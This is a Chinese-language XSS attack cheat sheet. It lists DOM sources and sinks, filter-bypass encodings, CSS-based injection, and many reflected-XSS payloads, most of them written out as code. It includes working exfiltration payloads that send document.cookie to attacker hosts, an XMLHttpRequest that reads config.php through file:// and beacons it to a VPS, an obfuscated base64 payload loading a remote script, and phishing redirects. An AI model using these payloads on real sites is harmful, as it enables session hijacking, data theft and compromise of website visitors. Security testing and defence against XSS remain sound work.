# xss注入

## 不同的xss类型

### 反射型xss

### 储存型xss

### dom xss

客户端产生xss

测试技巧:关注输入和输出

**输入:**

document.URL

document.URLUnencoded

document.location

document.referrer

document.xxxx

window.location

window.name

window.xxxxxx

**输出:**

document.write()

document.writeln()

document.body.innerHtml=...

document.forms[0].action=...

document.attachEvent(...)

document.create...(...)

document.execCommand(...)

document.body. ...

window.attachEvent(...)

document.location=...

document.location.hostname=...

document.location.replace(...)

document.location.assign(...)

document.URL=...

window.navigate(...)

document.open(...)

window.open(...)

window.location.href=...

eval(...)

window.execScript(...)

window.setInterval(...)

window.setTimeout(...)







## xss cheat sheet

http://ha.ckers.org/xss.html

https://gist.github.com/kurobeats/9a613c9ab68914312cbb415134795b45

## 绕过xss-filter

### html标签属性执行xss

属性:href,lowsrc,src,bgsound,background,value,action,dynsry

### 空格回车,tab

原理:javascript 引擎对语句的解析

```html
<img src="javas
          cript:
          alert(0)"
```

### 对标签属性值的转码

html中属性值本身支持ascii码格式

```html
<img src="javascript:alert(/xss/)">
变为
<img src="javascript&#116&#58alert(/xss/)">
将&#116变为&#000000116也行
还可以将&#01,&#02等支付插入到javascript或vbscript头部
```

### 产生自己的事件

onerror,onerror

### 利用css跨站攻击

```css
<div style="background-image:url(javascript:alert('xss'))"
<style>
body{
    background-image:url("javascript:alert('xss')")
}
</style>
<div style="width:expression(alert('xsss'));">
<style>
@import 'javascript:alert()'
</style>
```

加载css的方式:

- link标签
  `<link rel="stylesheet" href="xxxx.css">`
- @import
  `<style type='text/css'>@import url(xxxx.css);</style>`

### 扰乱过滤规则

```html
<img/src="mar.png" alt="mars">
    样式标签中的/**/和\和\0会被浏览器忽略
    <img src="java/*exp/**/script:alert();*/ression(alert(0))">
    @\i\0m\00p\0000\0000\00000r\000000t "url"
   将css中的关键字进行转码处理,如将e转换成\65
    <p style="xss:\0065xpression(alert(/xss/))">
        
   样式表也支持分析和解释\连接的16进制字符串形式
        <style>BODY{background:\75\72\6c....}</style>
```





## 常用的xss语句

读cookie:document.location='http://ip或域名/?'+document.cookie

读源码:document.location='http://ip或域名/?'+btoa(document.body.innerHTML)

### 访问网页

```javascript
xmlhttp=new XMLHttpRequest();
xmlhttp.onreadystatechange=function()
{
    if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
        document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);
    }
}
xmlhttp.open("POST","request.php",true);
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xmlhttp.send("url=file:///var/www/html/config.php");
```

### 重定向

` document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);`



## **反射型XSS Poc:**

 

**alert()函数过滤：**

```
<script>alert('xss')</script> 
<script>confirm('xss')</script> 
<script>prompt('xss')</script> 
```

 

<script>标签过滤：

```
<a href="onclick=alert('xss')"> click</a>123"><a/href=//www.baidu.com/>XssTest</a>
<img src=# onerror=alert('xss')></img>
<iframe onload=alert('xss')>
```

 

**base64加密**

```
<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>
```

 

**setTimeout**

```
<svg/onload=setTimeout('ale'+'rt(1)',0)>
```

 

**过滤双引号**

```
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
```

 

**chrome**

```
<img src ?itworksonchrome?\/onerror = alert(1)>
```

 

**data形式**

```
<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg></object>
<embed src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg></embed>
<script src=data:%26comma;alert(1)></script>
```

 

**ontoggle**

```
<details open ontoggle="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#24050;&#26159;&#40644;&#26127;&#29420;&#33258;&#24833;&#65292;&#19968;&#26525;&#32418;&#26447;&#20986;&#22681;&#26469;&#39;&#41;">
```

 

**frame**

```
<frame src="javascript:alert(1)">
<frame src="javascript:%20%0aalert%20%0d %09(1)">
<iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />2134'></textarea><script>alert(/xss/)</script><textarea>
```

 

**url加密绕圆括号**

```
<svg/onload=alert(1)>
<svg onload='JavascRipT:alert%281%29'>
<svg/onload ="location='jav'+'ascript'+':%2'+'0aler'+'t%20%2'+'81%'+'29'">
```

 

 **XSS漏洞利用方式：**



```
<script>window.location="http://www.baidu.com"</script>   重定向钓鱼
<script>window.location="http://1.1.1.1/cookie.php?cookie="+document.cookie;</script>  接受客户端cookie
<script>new Image().src="http://1.1.1.1/c.php?output="+document.cookie; </script> http://login.xxx.com/sso/m/mobile-login.do?next_page=http://m.xxx.com&f=coursek12xss",}});setTimeout(atob('ZG9jdW1lbnQuYm9keS5pbm5lckhUTUwgPSAnJztkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpKS5zcmM9Jy8vZHQzMDEuY29tLzAuanMnOw=='),0);({validate: {//
```

## 利用php语言特性

### php

$_SERVER['PHP_SELF']

其中PHP_SELF可以换为:SCRIPT_URI,QUERY_STRING,PATH_INFO等

例子:

```php
<form method="POST" action="<?php echo $_SERVER('PHP_SELF')?>">
</form>
```



exp:

`http://127.0.0.1/1.php/%22%3e%3cscript%3ealert('xss')%3c/script%3e%3cfoo`



## xss工具

xss-proxy,xssshell,attackapi,anehta,avws